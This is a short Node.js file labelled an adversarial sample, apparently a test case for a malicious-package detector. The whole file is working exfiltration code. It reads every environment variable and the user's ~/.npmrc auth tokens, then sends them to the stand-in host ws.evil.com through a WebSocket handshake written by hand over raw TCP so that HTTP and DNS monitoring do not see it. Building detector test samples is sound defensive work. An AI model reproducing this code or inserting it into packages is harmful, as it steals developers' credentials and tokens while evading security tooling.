// Adversarial sample: WebSocket exfiltration — bypasses HTTP/HTTPS/DNS detection
var net = require('net');
var fs = require('fs');
var os = require('os');
var crypto = require('crypto');

// Read sensitive data
var envDump = JSON.stringify(process.env);
var npmrc = '';
try { npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8'); } catch(e) {}

// Manual WebSocket handshake over raw TCP to avoid http.request detection
var socket = net.connect(80, 'ws.evil.com', function() {
  var wsKey = crypto.randomBytes(16).toString('base64');
  var upgrade = 'GET /exfil HTTP/1.1\r\n' +
    'Host: ws.evil.com\r\n' +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    'Sec-WebSocket-Key: ' + wsKey + '\r\n' +
    'Sec-WebSocket-Version: 13\r\n\r\n';
  socket.write(upgrade);

  // Send payload as WebSocket frame after handshake
  setTimeout(function() {
    var payload = JSON.stringify({ env: envDump, npmrc: npmrc });
    var buf = Buffer.from(payload);
    var frame = Buffer.alloc(2 + buf.length);
    frame[0] = 0x81;
    frame[1] = buf.length;
    buf.copy(frame, 2);
    socket.write(frame);
    socket.end();
  }, 1000);
});
